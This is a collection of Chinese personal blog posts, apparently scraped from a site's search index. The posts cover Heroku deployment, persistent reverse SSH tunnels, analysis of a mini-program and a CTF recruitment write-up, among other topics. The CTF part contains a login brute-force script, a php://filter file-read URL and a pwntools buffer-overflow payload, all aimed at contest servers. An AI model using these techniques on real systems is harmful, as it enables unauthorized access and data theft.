注册一个账号 网址https://www.heroku.com/ 略。建议用gmail，不过也看到用国内邮箱也成功的。 安装Heroku CLI 命令行接口 Win-x64：下载地址 其他环境的见官网好了。https://devcenter.heroku.com/articles/heroku-cli 安装完之后就可以在命令行用heroku命令了。 登录 heroku login 会弹出网页登录验证，或者在命令行登录。 准备好app 你看他支持的语言挺多的呢。 我这里用到的就是python啦。 这个在上一节已经搭建好了喵。 创建app heroku create 这时候同时建立了一个名为heroku的git remote仓库，连接到了你本地的git仓库。 当然也可以现在网站上创建一个应用，再clone heroku git:clone -a nuaaical cd nuaaical 这里前提是建立好了名为nuaaical的应用了。 建立依赖相关的requirements.txt 略。 指定执行的入口 这里算是一个坑吧，折腾了好久才发现。 你必须先在代码目录下建立一个名为Procfile的文件，在里面写上你要他执行的命令。比如执行一个python文件之类的。 在这里用的是gunicorn来建立一个web应用。（flask只用于本地测试使用 web: gunicorn web:app第二个web是文件名（web.py），app是flask实例化的对象啦。（代码里写的app = Flask(__name__) 指定用构建语言（可略？） heroku buildpacks:set heroku/python 显示指定用python来构建打包（网上有的说不指定会报错？ 部署代码 终于可以部署了呀！直接push好了。 git push heroku master 如果不行的话加上-f强制push（小心一点）。 然后可以看到部署的日志，如果有问题就再看看。 没问题的话，效果类似下面的。 看看你的网站吧 heroku open 然后会调用你的浏览器打开。 或者自己在浏览器访问就好了。 嘻嘻嘻，到这就结束啦~ 拓展当然还有一些常用命令，比如： 查看日志(debug必备了) heroku logs --tail 看一下还有多少剩余时长 heroku ps 打开app服务 heroku ps:scale web=1 关闭app服务 heroku ps:scale web=0 etc. 官方文档Getting Started on Heroku看这里 https://devcenter.heroku.com/start 除此以外，Heroku还支持pipeline，还可以授权从GitHub上同步部署，还有容器啥的…… 感觉还是挺不错的呢！ Achievements部署好的web端网址： https://nuaaical.herokuapp.com/ 欢迎来试试呀！ 第一次访问可能会花一些时间，等一等吧。 如果不成功的话刷新一下页面（但不要重复提交登录信息），或重新开一个页面访问。 同时多人访问的话也可能会有问题（没试过），那就再试试吧。（摊手 好了我知道这个页面丑了。现学的HTML，别说了。 其实之前奶冰奶冰奶冰冰做了一个前端的↓ 后面再折腾吧咕咕咕 欢迎来贡献代码呀！ 其实之前还折腾了老半天，尝试了在Azure上部署，也成功了。 需要在VSCode中进行部署，然后在配置里设好启动命令（也可以是一个文件）。 不过现在Azure服务到期了。部署的网站也停止了呢。 截个图纪念一下吧。 （hackathon的时候白嫖的Azure还是挺爽的233 同时，代码开源在GitHub上了。欢迎来点个star，提个PR喵！ https://github.com/miaotony/NUAA_iCal_Web 仅供学习研究，未经允许禁止商用，谢谢。 文章中不免存在问题，欢迎提出。 Reference https://devcenter.heroku.com/ https://www.jianshu.com/p/191248ad2639 浪够了，继续准备考试。（真难顶…… 期末冲冲冲！ 说不定这是今年最后一篇blog了喵。 溜了溜了。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/12/29/Tech_NUAAiCalWeb_deploy/"},{"title":"小想法 | 基于VSCode和ssh实现远程编程/炼丹","text":"Cause在内网有一台服务器，能连接外网但由于没有公网 IP 而无法在外网直接访问，之前想要在上面跑程序的时候，就得通过远程桌面进行操作。虽然 Teamviewer 速度还可以，但总感觉有点不太爽…… 很久以前（大概一两个月前）就在逼乎上看到过一篇文章说可以 使用vscode进行远程炼丹 （原文见 Reference #1 噫！我来兴趣了，而且其实早就想试试了，然而之前在忙别的没空折腾（其实现在也没空），就是前几天在配服务器环境的时候（麻烦到爆炸，最讨厌配环境了），一想干脆就再折腾一下，弄好远程炼丹（编程）吧。 于是乎就这样连Linux命令都不知道几个的憨憨瞎折腾了一两天的ssh，终于实现了远程炼丹，贼有成就感嘻嘻嘻。 其中遇到了一些奇怪的问题，简单记录一下，也方便我忘了再回来看看吧。 时间有限，VSCode的部分就大概提一下思路，重点是ssh的部分吧…… Guidance for ssh不妨假设如下，记清楚了噢，后面频繁用到的。 computer IP/address info 内网服务器A 172.x.x.x 可以访问外网，但外网不能直接访问A 公网服务器B test.com 可以访问外网，也可被外网访问 能够联网的主机C - 想要在C上对A进行访问 内网服务器A上的设置A设置反向代理到B的 port1 端口 工作原理：1、本地主机和远程主机建立连接；2、远程主机上分配了一个 socket 侦听 port 端口；3、远程端口上有了连接, 该连接就经过安全通道转向本机的端口。 备注：root 登录远程主机才能转发特权端口。 ssh -fCNR &lt;port1>:localhost:22 usr_b@test.com -p 22 -R port1:host:port2 将远程机器的端口映射到本地。port1是公网服务器B的端口，host为本地A的IP，port2是A要映射到公网的端口。usr_b@test.com 用户名@服务器B地址，表示连接到B，以用户usr_b登录。当然test.com也可以是IP地址啦。-f SSH客户端在后台运行-C 允许压缩-g 允许远程主机可远程访问，这里有坑。 （但autossh没有这个选项所以应该影响不大）-N Do not execute a shell or command. 不执行脚本或命令，通常与-f连用。-p 22 表示指定连接到B的22端口，默认就是22啦，如果不是的话设置成B的ssh端口。 注意一下，（网上说）这里有个坑，-g还需要在公网服务器B做下面的设置，设置完后再重启服务。 ＃vim /etc/ssh/sshd_config 新增 GatewayPorts yes 进阶1 autossh由于ssh会自动断开连接，于是利用自动重连工具autossh，保证连接稳定。 首先安装autossh，这里我用的是CentOS系统。其他类似的。 sudo yum -y install autossh 其实我发现yum（的源里）找不到autossh，后来是用wget下载然后手动安装的… screen -S reverse_proxy autossh -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com 多了个-M参数，表示从B的port2检测是否断线。同时autossh会在后台运行，-f也不需要了。 这里的screen用于命令行终端切换，给这个界面起了个名叫reverse_proxy，当然没有装screen的话也需要装一下，不过不执行screen这条语句理论上也能用。 注意，port1和port2均需要在B的安全组内设好规则，允许外网访问。 而后看一下有没有运行↓ 可见A已和B建立连接。此处port1为9999，port2为9998，仅用于演示，你完全可以看心情选择你喜欢的端口，当然有的端口有特定功能另外说。 进阶2 开机自启当然，为了连接再可靠一点，确保A重启后还可以连上，可以在A上再设置一下开机自动启动autossh。 有一种方法是在/etc/rc.local里面添加如下内容 su - user_a -c \"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com\" 其中，-i后接的是SSH_KEY_FILE_PATH，即私钥地址，root用户默认为/root/.ssh/id_rsa。user_a是A上的用户，且要求在公网服务器B上，已经有了A主机上用户user_a的公钥（这个在下面B的设置中介绍）。 然后记得给这个文件赋予可执行权限。 chmod +x /etc/rc.d/rc.local 不过看这个文件注释里的说法，好像这个方法不推荐了。 当然还可以使用其他的配置开机自启的方法，我也刚折腾对Linux也不熟，后面再看看吧。 现在你可以reboot试一下了，前提是你能确保用这台服务器的其他人没意见，重要数据记得保存好噢。 这样A上的设置就告一段落了，下面看公网服务器B。 公网服务器B上的设置如果只需要在B上对A进行远程炼丹，那就不需要在B上设置啥了，现在直接ssh就完事了。 ssh -p &lt;port1> localhost 因为已经把A的ssh对应的22端口映射到B的port1端口了呀！ 试一下果然如此。 进阶 免密登录这样每次登录都需要输入密码，是有点麻烦了。 这有个办法，就是把本机的ssh公钥复制到要登录的服务器A的~/.ssh/authorized_key文件中，实现免密登录。 什么，你还觉得太麻烦了？？？ 这里还有一个快办法，就是在B上登录A后执行这个—— ssh-copy-id -i .ssh/id_rsa.pub usr_a@172.x.x.x -i 指向本地的公钥文件，一般在用户的目录下。usr_a 为A上要登录的用户名 然后就可以从B免密登录内网服务器A啦。你现在可以在B上ssh试一下，理论上直接就已经登录好了呢！ 在任意一台联网主机C对A进行访问的实现到这里我有点成就感了，远程炼丹实际上已经实现了。 然而我的初衷是要在一台能联网的主机C上去连接内网A的呀，不行还得再折腾一下啊呜。 首先试了一下直接连接公网服务器B的port1，然而不可行。 不过网上有些资料说是可行的，这个我也不知道呢，可能要问神奇的海螺吧。 根据网上的说法，已经在B上对GatewayPorts进行了设置，也杀死进程重启了服务甚至直接reboot了，然而不知道为啥不可行…… 不过也不是没有办法呢，ssh里还有个正向代理闲着没事干呢，说上就上吧。 在B上继续进行如下配置 ssh -fCNL *:&lt;port3>:localhost:&lt;port1> localhost 表示将B上的port1映射到port3，注意port3也要设置安全组规则啊。 用ss -ant 看了一下，port3的确打开了。 理论上这样的话在C上ssh连接B的port3端口，就可以直接访问到内网A了的。 如果你成功了，那就可以直接跳到配置VSCode的部分了，尽情享受远程炼丹的快感吧！ 喜欢的话可以滑到页面下方，赞赏一下给我买点好吃的（我饿了.jpg 然而我并没有成功…… 看了一下安全组设置，没问题，唉，大不了全开了嘛。还是不行。 这里我难受死了，杀死进程又重来试了好几次，一样没有效果。 再去网上查了查，直到看到一篇文章里提到了这个问题，但他直接用的ssh而没有用到autossh，用他的方案还是没解决问题。不过里面提到了一个命令叫lsof，即“列出打开文件(lists openfiles)”，而在Unix中一切（包括网络套接口）都是文件。这可是个神器啊！ 这里用到的是 使用-i :port来显示与指定端口相关的网络信息。 lsof -i :&lt;port3> # 查看连接port3端口的网络信息 结果类似于这样（忘记截图了），此处port3为仅供演示所用的9988。 # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 658 root 4u IPv6 146251 0t0 TCP *:9988 (LISTEN) 这里我才发现，噫，怎么只监听了IPv6，而没有IPv4啊！ 实际上通过ss -ant也可以发现对应的端口只有tcp6而没有tcp… 然而阿里云实例（安全组内）只有IPv4出口来着，而且也是通过IPv4连接到B的，怪不得连不上呢。（佛了 不过也奇怪了，理论上ssh应该v4和v6都监听的吧。 去查了一下ssh命令，这次强制使用 IPv4试试。 （在B上杀死之前的ssh，再执行下面的命令。记得改成你的端口哈。 ssh -fCNL *:&lt;port3>:localhost:&lt;port1> localhost -4 -4表示强制使用IPv4 这回再看lsof -i :&lt;port3&gt;： # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 954 root 4u IPv4 255331 0t0 TCP *:9988 (LISTEN) 然后再在C上连接B的port3端口。 哇哇哇成功了！ 看来果然是这个问题啊我哭了又笑了。 下面就可以设置VSCode来实现远程炼丹啦！ Guidance for VSCode具体可以参考Reference #1，这里简单操作一下。 在VSCode安装Remote Development开发包（扩展），然后在远程资源管理器里新增一个SSH Target。 在用户的.ssh/config文件内新增你的内网炼丹炉信息。 Host 给你的内网主机起个名（看你心情随意取）HostName 公网服务器B的IP或域名Port 填port3，如果port1能连上就填port1User 填内网服务器A的登录用户名 保存，然后便可以连接试一试了。 连接后输入A对应用户的密码，然后就连上了。打开文件夹还需要再输一次密码。 现在再用前面在B的配置里说的办法，把C主机的公钥放到A里就可以实现免密登录啦！ 呐，这就是在C上连接到内网炼丹炉的效果了↓。 网络延时几乎没有（不过也取决于网络环境），和在本地编程几乎没有差别，爽到爆炸！ 哇哇哇成就感爆棚啊哇哇哇！！！ Summary时间因素，不可避免可能存在一些失误之处，其中也有不少可以拓展之处，欢迎交流提出哈。 本文仅用于学习研究，请在合理合法范围内使用， 未经允许不得商用，转载请署名MiaoTony并保留本文链接，谢谢。 说点题外话吧。 上周末到这周部署NUAA_iCal_Web在线版本弄了一周末（好菜啊第一次弄部署来着…），配服务器环境折腾了老半天（甚至只装好了GPU驱动和anaconda还没配CUDA），配远程炼丹又瞎折腾了一两天，写这篇文章又断断续续地花了好几个小时。 呜下周开始频繁考试了，不敢瞎折腾了嘤嘤嘤。（溜了溜了 Reference 使用vscode进行远程炼丹 SSH反向连接使用Autossh自动ssh 利用阿里云ECS跳板机内网穿透- ssh SSH如何反向代理稳定穿透内网 内网穿透：在公网访问你家的 NAS （还包括frp相关） 从外网 SSH 进局域网，反向代理+正向代理 autossh 穿透，反向代理到内网 ssh-copy-id三步实现SSH无密码登录和ssh常用命令 Linux 命令神器：lsof 使用 autossh 自动重启 SSH 会话和通道 CentOS7添加开机启动服务或脚本 etc. 非常感谢上面这些文章，给了我很多启发呢。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/12/21/Idea_RemoteProgramming/"},{"title":"小想法 | QQ小程序【年终报告单/2019年终总结】分析","text":"缘由这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。 然而弹出一个遮罩层让你先看个15s的广告…… 超想吐槽，包括页面下面的广告。。 然后看完广告，终于出来了。 正当我截了图返回之后，噫换个性别试试。 好，这回不一样了呀！ 然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。 我兴趣来了，不如来折腾一下，分析一下这个小程序吧。 （不折腾会死…… 开始折腾 1先来看一看这个小程序的设置，发现只获取了用户信息。看一眼更多资料—— 先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是wxa.game-a1.cn 和free-api.heweather.com。 查了一下，后者是一个查天气的API（需要的话可以用一波）（就是很迷惑为啥这里会有这个 前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。 2ping了一下这个域名，得到IP：47.105.42.112 然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。 前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。 很明显是访问了http://wxa.game-a1.cn/wxa/qqnz2019/index.php这个网址。 3浏览器启动，F12大法好呀。 好一个JSON字符串，来分析一下吧。 qrcode很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。 url和url1都是一样的，指向了一个阿里云的对象存储。↓ https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png 多次刷新发现好像的确就那几张图片，改变了一下x.png而已。 而且的确这就是假的图啦。（不然哪来的用户数据可以分析 4既然都知道是几张图片而已了，那顺便就爬下来吧。 PyCharm 启动，来写一写jio本。 写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。 看结果的确就7张图片。。 呐就这几张了↓ 5看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。 就是这个form.php，看样子是用来统计使用数据的吧emmm问题不大。 小结哇呜折腾了一个中午好气啊，（有毒 不折腾会死 不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。 不过要吐槽这个广告超级讨厌emmm 就这样吧。 爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。 URL：这是网址 https://github.com/miaotony/Scrapy_2019Year-end_Report document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/12/04/Scrapy_2019Year-end_Report/"},{"title":"CTF | Asuri战队 2019招新赛 WriteUP","text":"Asuri 招新赛WriteUP 20191117网址： http://139.9.212.218:8000/challenges 官方安排及WriteUP：https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp testflag{this_is_test_flag} misc-签到 base64解码即得到 flag{1_want_jiamus_p0wer} baby-web-九曲十八弯 http://desperadoccy.club:39011/ base64解码 Asuri{view_source's_power} 快速计算 http://47.102.107.100:39012/ 连续20次在1-2s内判断是否正确，即可得到flag。 import requests import re import time s = requests.Session() r = s.get(\"http://47.102.107.100:39012/\") for i in range(20): time.sleep(1) equation = re.findall(r'&lt;div>(.*)=(.*)&lt;/div>', r.text)[0] print(equation) answer = eval(equation[0]) if answer == eval(equation[1]): values = {'answer': 'true'} else: values = {'answer': 'false'} r = s.post(\"http://47.102.107.100:39012/\", data=values) r.encoding = 'utf-8' print(r.text) Asuri{python_1s_th3_be3t_l4ngu4ge} medium_web_justburp http://139.9.212.218:39010/ 查找网站目录下的文件 访问robots.txt 得到： 访问hint.php 得到一个文件 尝试以admin作为用户名，用以上信息作为密码写脚本进行登录， 然而好像没有成功（有可能有成功的没看到？？？ 难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…加一个if重新来就看到了惹emmm 爆破一波 # -*- coding:utf-8 -*- import requests s = requests.Session() r = s.get(\"http://139.9.212.218:39010/index.php\") r.encoding = \"utf-8\" print(r.text) with open('name-pass.txt', 'r') as file: contents = file.read().split() # print(contents) passwords = contents for password in passwords: values = {'name': 'admin', 'password': password} r = s.get(\"http://139.9.212.218:39010/index.php\", params=values) r.encoding = 'utf-8' if '密码错误' not in r.text: print(r.text) 即可得到 &lt;!DOCTYPE html> &lt;html>&lt;head>&lt;meta charset=\"utf-8\" /> &lt;title>Hi hacker&lt;/title> &lt;/head> &lt;body bgcolor=\"bisque\"> &lt;form action=\"index.php\" method=\"get\">用户名：&lt;br>&lt;input type=\"text\" name=\"name\">&lt;br>密码：&lt;br>&lt;input type=\"text\" name=\"password\">&lt;br>&lt;br>&lt;input type=\"submit\" value=\"登陆\"> &lt;/form> &lt;p>hint:admin用户的密码似乎在某个页面里 &lt;/p> &lt;p> 看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}&lt;/p> &lt;/body> &lt;/html> flag: Asuri{Burp_1s_Gre@t} 其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。然而我现场还在搜它怎么用…… hard_web_php是世界上最好的语言 http://139.9.212.218:39009/ 改cookie重发 访问read_file.php，得到 访问no_flag_here.php ，构造参数进入根目录 然而！emmm这个scandir怎么获取这个flag文件内容啊！！！ 看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 构造file=php://filter/read=convert.base64-encode/resource=+绝对路径 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php 或者 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php 得到一串Base64字符串 PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg== 解码后： &lt;?php //Asuri{WEB_WINNER} ?&gt;flag: Asuri{WEB_WINNER} easy_pwn from pwn import * # 引入pwntools库 import time sh = remote('49.235.243.206', 9001) # 创建与靶场服务器的连接 offset = 0x60+0x8 # 偏移 system_addr = 0x400766 # system函数地址 for i in range(4, 20): sh.recvuntil('Please input your passworld size') sh.sendline(p64(i)) # 向程序发送数据 sh.recvuntil('Please input your password') payload = offset * b'a' + p64(system_addr) # 构造攻击数据 sh.sendline(payload) # 向程序发送数据 sh.interactive() # 将控制流从程序转移到自己这里 完了不会写，嘤嘤嘤 medium_rev#!/usr/bin/env python # encoding: utf-8 # 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc def encrypt_for_each(): index = [ 0] * 100 for i in range(100): tmp = i ^ 77 yield tmp None def encrypt(msg, key): iters = encrypt_for_each() enc = [] for (m, k) in zip(msg, key): e = m ^ k ^ iters.__next__() enc.append(e) return enc def generate_key(): def check_prime(num): if num &lt; 2: return False for i in range(2, num): if num % i == 0: return False return True test = [ 8, 61, 85, 25, 121, 53, 26, 0, 81, 52, 124, 22, 137, 56, 94, 107, 59, 132, 90, 3, 51, 46, 77, 127, 35, 86, 134, 20, 73, 32, 66, 99, 7, 69, 122, 4, 142, 23, 80, 109, 60, 79, 36, 62, 5, 104, 102, 14, 58, 149, 31, 96, 68, 114, 116, 11, 95, 87, 146, 123, 15, 135, 33, 37, 110, 19, 106, 30, 130, 101, 97, 98, 141, 2, 47, 6, 24, 131, 16, 111, 150, 55, 1, 76, 12, 138, 64, 120, 118, 29, 145, 147, 9, 113, 103, 40, 92, 71, 72, 129, 139, 100, 63, 133, 42, 125, 74, 88, 143, 144, 38, 140, 67, 119, 136, 115, 54, 21, 50, 108, 128, 57, 112, 43, 84, 70, 78, 28, 41, 93, 44, 13, 18, 10, 48, 27, 83, 65, 17, 75, 126, 39, 49, 91, 34, 82, 45, 148, 105, 89, 117] key = (lambda .0: continue[ i for i in .0 ])(filter(check_prime, test)) return key if __name__ == '__main__': key = generate_key() msg = [ 22, 21, 167, 66, 9, 27, 3, 119, 42, 99, 68, 86, 13, 166, 3, 120, 22, 59, 9, 77, 40, 3, 233, 41, 67, 108, 80, 179, 86, 36, 31, 107, 77, 4, 75] print('encryt message is {}'.format(msg)) lambda .0: continue[ i for i in .0 ] 这个.0执行不了啊emmm 我换成x也报错唉！ middle_pwn 小结 第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233 除了石榴园的真的没多少打这个比赛的呀。 我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤 现场查BurpSuite怎么用也是绝了（那节培训我没去emmm 总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ 等我有空再折腾一下，搭个博客吧 咕咕咕 20191128 更新：我来折腾了，嘻嘻嘻！ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/11/28/CTF_2019Asuri_Recruitment/"},{"title":"test","text":"测试一下再来一下哈~ 喵~~嘿嘿嘿 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/11/28/test/"},{"title":"typora_tips 一些关于typora的快捷键","text":"[TOC] ​ 随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~ 标题ctrl + 数字键 最多支持到六级标题 一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 取消标题​ ctrl + 数字0 标题取消标题 加粗ctrl + B 这是加粗 倾斜ctrl + I 这是倾斜 下划线ctrl + U 这是下划线 删除线alt + shift + 5 这是删除线 无序列表 - + space + enter miao miaomiao! 嵌套 再来嵌套 上一个层次 喵！ 有序列表数字键. + space + enter 第一个 第二个 嵌套一下 再来一下 再嵌套一个 继续 继续来 就这样吧 任务列表- [] TODO - [x]已完成 这是待完成的 这个已完成了 引用&gt; + space + enter 或者 ctrl + shift + Q 这就是引用 这也是 ​ 还可以嵌套引用 ​ 再来一个 这也行 一样的 插入图片ctrl + shift + I 网上说用MPic做图床挺不错的。（还没试过 直接拖进来也行 插入链接ctrl + K 这是链接，跳转到我的博客哈 插入表格ctrl + T mm text 测试 再测试 123 456 插入代码单行代码（文中的代码）ctrl + shift + ` `输入代码` 多行代码（代码块）ctrl + shift + K ``` 输入代码 ``` print(\"Hello world!\\n\") # Python printf(\"Hello, this is C.\") // C disp(\"Hello, this is MATLAB.\") % MATLAB print(\"Hello, this is lua.\") -- lua 插入表情:名称: (英文状态下) 🐱 🐶 PS：微软输入法可以用ctrl + shift + B弹出表情窗口。 😀👌 插入分割线--- 下面是分割线 插入高亮显示==中间写文字== ==这是高亮== 插入脚注文字[^脚注] 示例^1 插入公式ctrl + shift + M 或者 行内公式（内联公式）： $公式$ 行间公式： $$ 公式 $$ $$\\lim_{x\\to +\\infty} \\frac{1}{x}=0$$加个框试试（\\boxed{}）：$$\\boxed{ \\overrightarrow{AB}}$$ 这是行内公式 $ \\sqrt[3]{test} $ ，妙啊~ 具体的还得慢慢看呢。 顺便学一波LaTex也挺不错的~ 插入目录[toc] + ENTER 就是最上面那个啦~ 新建文件ctrl + N 选中中文/英文ctrl + D miao miao~ ctrl + Shift + 左/右 快速选中整个词语/单词。 选中整行ctrl + L 查找ctrl + F 替换ctrl + H 跳转到开头/结尾ctrl + HOME 跳转至文章开头 ctrl + END 跳转至文章末尾 打开文件（笔记）ctrl + P 全屏显示F11 侧边栏ctrl + shift + L 清除格式ctrl + \\ 切换到代码模式ctrl + / ==etc.== 还有挺多还要慢慢去发掘呢~ 顺便说一下 Snipaste 这个截图工具挺强大的 官网 https://zh.snipaste.com/ 本文搬运自我的csdn博客啦~ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/08/29/typora_tips/"},{"title":"小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统","text":"Park at ease停车场管理系统基于Python实现 Park Management SystemBased on Python… print('Hello, this is Park_at_ease!') 一些说明这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。 原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！ PS:原则上不提供技术支持哈。 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 欢迎大家在此基础上继续完善鸭~欢迎Star、Fork、提PR &amp; issue！ 使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！ Overview 这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。这里直接就截屏放出来吧，PDF还有别的内容懒得改了。如果有什么建议欢迎在GitHub上提issue或者在这里评论哈~！ TODO 管理员界面 Administrator Interface 文件操作 FileIO 登录界面 Login 登录加密 Login Encryption 图形界面 GUI 多线程或多进程 Multithreading or Multiprocessing 邮件推送 Email Push 微信推送 WeChat Push TCP 嵌入式开发 Embedded Development etc. 具体请移步到GitHub鸭！ 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 溜了溜了下次再见啦~ 搬运自我的csdn博客啦~ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/08/18/Park_at_ease/"},{"title":"小想法 | 基于模拟点击实现数据自动测量","text":"搬运一篇之前写的小想法啦~ 起因人工智能——先人工后智能哪里有现成数据给你还不是人工手动去测…… 大创要测数据emmm，简单来说就是点点按钮，等它数据测量完成，然后按照命名规范保存。就是这个也太枯燥了8，效率还低。不如py一下写个自动执行的！说写就写呗（斜眼笑.gif) 初代版本发现Python有个现成的第三方库叫PyAutoGui库，它给的函数还是挺方便的。按照测数据操作的流程用代码还原一遍，测试发现速度太快了电脑吃不消，于是乎到处加延时233。 总之还是挺不错的吧输入角度、次数、开始index（程序崩的时候备用），然后就可以自动开始测量，新建文件夹，按顺序命名保存。 理论一天可测的数据量从270组提高到435组，效率提升了61%吧！ 还要感谢潇潇弟弟陪我debug 嘻嘻嘻~ 升级版 Update on 20190725. 之前写的自动测数据的程序还有点小问题，今天又更新了两个版本。。 由于测量软件的问题，每组都会漏一些数据，所以还要手动补测。 于是乎今天加了个文件是否存在的判断，确定保存成功之后才继续下一组测量，这样就不用补测了！ 另外还加入了log，记录日志文件方便检查错误。 嘿嘿嘿~ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/07/10/Idea_AutoMeasure/"},{"title":"第一篇 随便写写","text":"搬运自我的CSDN博客 这篇可以算是第一次公开发出来的吧（其实严格来说也不算啦，只是之前发的年份过久估计都404或者找不到了233 print(\"Hello, everyone!\") Why? 上了大学之后，做大作业、写论文、写报告、做项目、参加各种比赛，经常需要各种找资料，大多是EE和CS方向的。 这时候经常就逛到CSDN、博客园、简书、逼乎之类的这些，或者大佬们自己搭建的博客，当然还有B站这样有着各种学习视频的好地方。 大家都乐于把自己的体会和经验分享出来，对于我这样的菜鸡来说帮助很大鸭。比如说码着码着代码遇到啥bug了，然后上来一查，很多时候别人也遇到过，于是乎什么情况下遇到的、如何解决的大都有了，很方便就能解决问题呢。 其实本来就觉得写点东西挺有意思的，特别是看到身边的小伙伴在CSDN上也开了自己的账号，开始分享自己的一些 debug 经历以及生活常事，越发觉得挺有意思的也挺有意义的。于是我也来写一写呗。 登录的时候突然才发现，CSDN上我的账号原来7年前就注册了，估计之前还只是随便逛逛以及下载些资料，都没有在这儿写过啥东西233。没事问题不大哈哈哈。 When?其实之前有啥小想法或者小制作，都是随便写两句话讲讲到空间……当然，有想法 &amp;&amp; 有空 的时候，就来这儿写点东西吧！ What?其实我感兴趣的东西挺多的 emmm比如说大体说一说嘛： 嵌入式相关 MCU单片机 FPGA 物联网 